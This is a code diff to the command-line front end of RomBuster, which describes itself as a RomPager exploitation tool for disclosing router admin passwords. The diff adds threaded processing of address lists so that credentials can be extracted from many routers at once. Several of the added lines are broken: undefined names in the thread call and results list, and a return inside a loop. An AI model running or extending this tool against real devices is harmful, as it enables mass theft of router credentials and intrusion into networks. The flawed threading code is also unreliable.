@@ -25,41 +25,57 @@
 #
 
 import argparse
+import threading
 
 from .__main__ import RomBuster
 from .badges import Badges
 
 
 class RomBusterCLI(RomBuster, Badges):
+    thread_credentials = list()
+
     description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
     parser = argparse.ArgumentParser(description=description)
+    parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work. [best]')
     parser.add_argument('--list', dest='list', help='Addresses list.')
     parser.add_argument('--address', dest='address', help='Address.')
     args = parser.parse_args()
 
     def hack(self, host):
-        self.print_process(f"({host}) - connecting to device ...")
+        self.print_process(f"({host}) - connecting to device...")
         response = self.connect(host)
 
         if response is not None:
-            self.print_process(f"({host}) - accessing device rom ...")
+            self.print_process(f"({host}) - accessing device rom...")
             creds = self.exploit(response)
 
             if creds is not None:
-                self.print_process(f"({host}) - extracting credentials ...")
+                self.print_process(f"({host}) - extracting credentials...")
                 for username in creds.keys():
-                    self.print_information(f"({host}) - {username}:{creds[username]}")
+                    return f"({host}) - {username}:{creds[username]}"
             else:
                 self.print_error(f"({host}) - rom access denied!")
         else:
             self.print_error(f"({host}) - connection rejected!")
 
+    def thread(self, number, host):
+        self.print_process(f"Thread #{str(number)} processing...")
+        result = self.hack(host)
+        thread_credentials.append(result)
+        self.print_information(f"Thread #{str(number)} finished.")
+        
     def start(self):
         if self.args.list:
             with open(self.args.list, 'r') as f:
                 lines = f.read().strip().split('\n')
+                line_number = 0
                 for line in lines:
-                    self.hack(line)
+                    if not self.args.threads:
+                        self.hack(line)
+                    else:
+                        process = threading.Thread(thread, args=[line_number, line])
+                        process.start()
+                    line_number += 1
         elif self.args.address:
             self.hack(self.args.address)
         else:
